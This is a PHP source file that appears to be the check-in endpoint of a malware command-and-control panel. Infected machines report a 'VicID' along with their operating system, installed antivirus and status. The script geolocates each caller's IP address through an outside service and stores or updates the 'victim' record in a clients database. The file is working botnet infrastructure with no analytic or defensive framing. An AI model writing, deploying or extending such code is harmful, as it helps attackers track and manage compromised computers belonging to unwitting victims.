<?php
include 'classes/database.php';
include 'classes/clients.php';

$client = new Clients;
$_GET   = filter_input_array(INPUT_GET, FILTER_SANITIZE_STRING);
$VictimID =  isset($_GET['VicID']) ? $_GET['VicID']: '';

if (filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP)) {
    $ipadress =  $_SERVER['REMOTE_ADDR'];
} else {
    $ipadress = "127.0.0.1";
}

$contery = strtolower(GetConteryCode($ipadress));
$os =  isset($_GET['os']) ? $_GET['os']: '';
$antivirus =  isset($_GET['antivirus']) ? $_GET['antivirus']: '';
$status =  isset($_GET['status']) ? $_GET['status']: '';

if ($client->isExist($VictimID,"clients")) {
      $client->updateClient($VictimID,$ipadress,$contery,$os,$antivirus,$status);
 } else {
      $client->newClient($VictimID,$ipadress,$contery,$os,$antivirus,$status);
}

function GetConteryCode($IPaddress) {
   $json = file_get_contents('http://www.geoplugin.net/json.gp?ip='.$IPaddress); 
   $data = json_decode($json);
   if ($data->geoplugin_countryCode == "") {
       return "X";
   } else {
       return $data->geoplugin_countryCode;
   }
}
?>